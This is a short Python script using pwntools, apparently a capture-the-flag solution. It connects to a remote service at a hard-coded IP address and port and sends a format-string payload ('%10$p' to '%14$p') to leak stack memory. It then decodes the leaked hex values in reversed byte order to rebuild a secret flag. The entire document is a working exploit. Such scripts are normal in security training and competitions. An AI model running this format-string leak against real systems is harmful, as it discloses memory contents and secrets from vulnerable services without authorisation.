#!/usr/bin/python
from pwn import *
import sys
r = remote('140.113.24.241', 30172)
payload = ""
for i in range(10, 15):
    payload += "%" + str(i) + "$p"
    
r.sendline(payload.encode())
s = r.recv().decode()
ss = s.split('0x')
flag = ""
for x in ss:
    if x == "":
        continue    
    tmp = ''
    for i in range(int(len(x)/2)):
        tmp += chr(int(x[i*2:i*2+2], 16))
    flag += tmp[::-1]
print(flag)
r.close()
        